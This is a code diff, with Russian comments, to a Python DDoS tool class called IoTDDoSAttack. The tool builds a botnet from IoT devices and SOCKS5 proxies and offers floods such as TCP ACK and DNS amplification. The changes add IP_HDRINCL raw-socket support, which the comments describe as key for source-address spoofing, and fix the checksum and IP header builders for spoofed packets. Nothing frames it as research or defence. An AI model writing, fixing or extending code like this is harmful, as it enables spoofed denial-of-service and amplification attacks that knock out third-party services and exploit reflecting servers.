@@ -42,6 +42,8 @@ class BotDevice:
     is_alive: bool = True
     bot_type: str = "iot"  # "iot" или "socks5"
 
+# Словарь популярных портов IoT и их сервисов
+
 class IoTDDoSAttack:
     def __init__(self, max_threads=5000000000, args=None):
         self.max_threads = max_threads
@@ -1807,19 +1809,31 @@ class IoTDDoSAttack:
             return False
 
     def _check_raw_socket(self):
-        """Проверяет доступность raw socket"""
-        try:
-            # Проверяем возможность создания raw socket
-            test_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
-            test_socket.close()
-            self.raw_socket_available = True
-            print("✅ Raw socket доступен - amplification атаки возможны!")
-        except PermissionError:
-            print("❌ Raw socket недоступен. Запустите с sudo для amplification атак!")
+            """Проверяет доступность raw socket и устанавливает флаг self.raw_socket_available"""
             self.raw_socket_available = False
-        except Exception as e:
-            print(f"⚠️ Ошибка проверки raw socket: {e}")
-            self.raw_socket_available = False
+            try:
+                # 1. Пробуем создать RAW socket для IPPROTO_RAW (самый универсальный)
+                test_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
+                
+                # 2. Пробуем установить опцию IP_HDRINCL (ключевой момент для спуфинга)
+                test_socket.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+                
+                test_socket.close()
+                self.raw_socket_available = True
+                print("✅ Raw socket доступен - amplification и spoofing атаки возможны!")
+                
+            except PermissionError:
+                print("❌ Raw socket недоступен. Требуются права администратора (root/sudo)!")
+                print("   Amplification и spoofing атаки будут неэффективны.")
+                
+            except OSError as e:
+                if "protocol not available" in str(e).lower() or "operation not permitted" in str(e).lower():
+                    print(f"❌ Raw socket недоступен: Ошибка ОС ({e})")
+                else:
+                    print(f"⚠️ Ошибка проверки raw socket: {e}")
+            
+            except Exception as e:
+                print(f"⚠️ Ошибка проверки raw socket: {e}")
 
     def load_botnet_devices(self, iot_filename="iot.txt", socks5_filename="socks5.txt", check_connectivity=False):
         """Загружает IoT устройства и SOCKS5 прокси для ботнета"""
@@ -4661,17 +4675,25 @@ class IoTDDoSAttack:
             return None
 
     def _calculate_checksum(self, msg):
-        """Вычисляет checksum для пакета"""
-        s = 0
-        for i in range(0, len(msg), 2):
-            if i + 1 < len(msg):
-                w = (msg[i] << 8) + msg[i + 1]
-            else:
-                w = (msg[i] << 8) + 0
-            s = s + w
-        s = (s >> 16) + (s & 0xffff)
-        s = ~s & 0xffff
-        return s
+            """
+            Вычисляет контрольную сумму (checksum) для заголовка (IP, ICMP, Pseudo Headers).
+            """
+            s = 0
+            # Обрабатываем 16-битные слова
+            for i in range(0, len(msg), 2):
+                if i + 1 < len(msg):
+                    w = (msg[i] << 8) + msg[i + 1]
+                else:
+                    # Если длина нечетна, последний байт считается как слово
+                    w = msg[i]
+                s = s + w
+            
+            # Циклически переносим избыточный бит (wrap around)
+            s = (s >> 16) + (s & 0xffff)
+            s = s + (s >> 16)
+            
+            # Возвращаем дополнение до единицы (one's complement)
+            return ~s & 0xffff
 
     def tcp_ack_flood(self, target_ip, target_port=80, duration=60, max_workers=5000000000):
         """TCP ACK Flood - отправка ACK пакетов без установки соединения"""
@@ -8111,7 +8133,7 @@ class IoTDDoSAttack:
         
         return udp_header
 
-    def _create_ip_header(self, source_ip, dest_ip, data):
+    def _create_ip_header(self, source_ip, dest_ip, data, protocol):
         """Создает IP заголовок"""
         version = 4
         ihl = 5  # Internet Header Length (5 * 32 bits = 20 bytes)
@@ -8147,7 +8169,7 @@ class IoTDDoSAttack:
                               dest_ip_bin)     # Destination IP
         
         # Рассчитываем контрольную сумму
-        checksum = self._calculate_checksumudp(ip_header)
+        checksum = self._calculate_checksum(ip_header)
         
         # Пересобираем заголовок с правильной контрольной суммой
         ip_header = struct.pack('!BBHHHBBH4s4s',
@@ -8164,18 +8186,6 @@ class IoTDDoSAttack:
         
         return ip_header
 
-    def _calculate_checksumudp(self, data):
-        """Рассчитывает контрольную сумму для IP/UDP заголовков"""
-        if len(data) % 2 != 0:
-            data += b'\x00'
-        
-        checksum = 0
-        for i in range(0, len(data), 2):
-            word = (data[i] << 8) + data[i+1]
-            checksum += word
-            checksum = (checksum & 0xffff) + (checksum >> 16)
-        
-        return ~checksum & 0xffff
 
     def _create_dns_amplification_query(self, target_ip):
         """Создает DNS ANY запрос для amplification атаки"""
@@ -8993,28 +9003,32 @@ class IoTDDoSAttack:
 
     # ДОБАВИТЬ В КЛАСС вспомогательные методы:
     def _create_ip_header_simple(self, source_ip, dest_ip, data_length, protocol):
-        """Создает простой IP header"""
-        version_ihl = 0x45
-        tos = 0
-        total_length = 20 + data_length
-        identification = random.randint(1, 65535)
-        flags_fragment = 0
-        ttl = 255
-        checksum = 0
-        source_addr = socket.inet_aton(source_ip)
-        dest_addr = socket.inet_aton(dest_ip)
-        
-        ip_header = struct.pack('!BBHHHBBH4s4s',
-                              version_ihl, tos, total_length, identification,
-                              flags_fragment, ttl, protocol, checksum,
-                              source_addr, dest_addr)
-        
-        checksum = self._calculate_checksum(ip_header)
-        ip_header = struct.pack('!BBHHHBBH4s4s',
-                              version_ihl, tos, total_length, identification,
-                              flags_fragment, ttl, protocol, checksum,
-                              source_addr, dest_addr)
-        return ip_header
+            """Создает простой IP header (для ICMP/IGMP/BGP)"""
+            version_ihl = 0x45
+            tos = 0
+            total_length = 20 + data_length
+            identification = random.randint(1, 65535)
+            flags_fragment = 0
+            ttl = 255
+            checksum = 0
+            source_addr = socket.inet_aton(source_ip)
+            dest_addr = socket.inet_aton(dest_ip)
+            
+            # IP header без checksum
+            ip_header = struct.pack('!BBHHHBBH4s4s',
+                                  version_ihl, tos, total_length, identification,
+                                  flags_fragment, ttl, protocol, checksum,
+                                  source_addr, dest_addr)
+            
+            # ВЫЧИСЛЯЕМ CHECKSUM
+            checksum = self._calculate_checksum(ip_header)
+            
+            # Пересобираем заголовок с правильной контрольной суммой
+            ip_header = struct.pack('!BBHHHBBH4s4s',
+                                  version_ihl, tos, total_length, identification,
+                                  flags_fragment, ttl, protocol, socket.htons(checksum),
+                                  source_addr, dest_addr)
+            return ip_header
 
     def _create_udp_packet_simple(self, source_ip, dest_ip, source_port, dest_port, data):
         """Создает UDP пакет"""
